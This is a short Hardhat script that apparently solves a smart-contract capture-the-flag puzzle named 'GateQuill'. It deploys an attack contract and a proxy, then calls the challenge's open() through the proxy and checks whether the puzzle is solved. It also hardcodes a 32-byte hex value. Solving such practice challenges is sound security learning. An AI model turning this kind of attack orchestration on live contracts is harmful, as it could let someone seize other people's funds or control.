import chalk from "chalk";
import { ethers } from "hardhat";
import { GateQuill__factory, GateQuill, GateQuillAttack__factory, GateQuillAttackProxy__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [gateQuillContract, attacker] = await initialize<GateQuill>(GateQuill__factory, "0x7bc2a7bd64001ad368650740a8d900e56e988d74e7d7dc9845ba87bfe908aa05");

    let gateAttack = await new GateQuillAttack__factory(attacker).deploy();
    await gateAttack.waitForDeployment();

    log(`GateQuillAttack deployed to: ${chalk.yellow(await gateAttack.getAddress())}`);
    
    let proxy = await new GateQuillAttackProxy__factory(attacker).deploy();
    await proxy.waitForDeployment();

    let tx = await gateQuillContract.open(await proxy.getAddress());
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await gateQuillContract.opened())}`); 
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});